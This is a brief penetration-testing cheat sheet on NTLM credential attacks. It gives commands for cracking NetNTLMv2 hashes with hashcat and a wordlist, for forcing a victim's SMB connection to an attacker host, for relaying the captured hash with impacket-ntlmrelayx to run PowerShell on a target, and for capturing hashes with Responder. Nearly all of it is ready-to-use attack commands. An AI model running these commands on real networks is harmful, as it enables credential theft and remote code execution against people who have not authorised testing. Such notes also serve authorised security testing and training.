#hashcat #hash #hashes #hash-ids

HashCat example hash modes:
---
https://hashcat.net/wiki/doku.php?id=example_hashes

NetNTLMv2 hash brute forcing:
---
#ntlm #ntlm2 #responder
```shell
hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt --force
```

force SMB connection to attacker and relay NTLM hashes:
```powershell
dir \\$ATTACKER_IP\test
```

```bash
impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET_IP -c "powershell ..."
```
or just log the hash for reusing it:
```bash
sudo responder -I tun0
```